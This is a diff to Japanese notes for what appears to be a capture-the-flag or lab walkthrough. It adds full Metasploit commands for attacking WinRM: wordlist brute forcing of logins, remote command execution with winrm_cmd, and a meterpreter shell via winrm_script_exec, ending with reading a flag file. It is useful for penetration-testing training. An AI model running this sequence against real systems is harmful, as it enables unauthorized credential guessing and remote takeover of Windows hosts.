@@ -131,6 +131,7 @@ demo winrm:msfによるエクスプロイト
 1) nmap --top-ports 7000 target domain
 2) msfconsole
 3) 基本情報の設定
+use auxiliary/scanner/winrm/winrm_login
 set RHOSTS target
 set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
 set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
@@ -142,7 +143,19 @@ use /auxiliary/scanner/winrm/winrm_auth_methods
 set RHOSTS target
 exploit
 5) winrm_cmdと3)で得た認証情報を使って悪用する
-6) winrm_script_execエクスプロイトモジュールを使用して、meterpreterを取得
+use auxiliary/scanner/winrm/winrm_cmd
+set RHOSTS target
+set USERNAME
+set PASSWORD
+set CMD whoami
+exploit
+6) winrm_script_execエクスプロイトモジュール（使う認証は、3)で取得したもの）を使用して、meterpreterを取得
+use exploit/windows/winrm/winrm_script_exec
+set RHOSTS target
+set USERNAME
+set PASSWORD
+set FORCE_VBS true
+exploit
 7) cd /
 8) dir
 9) cat flag.txt
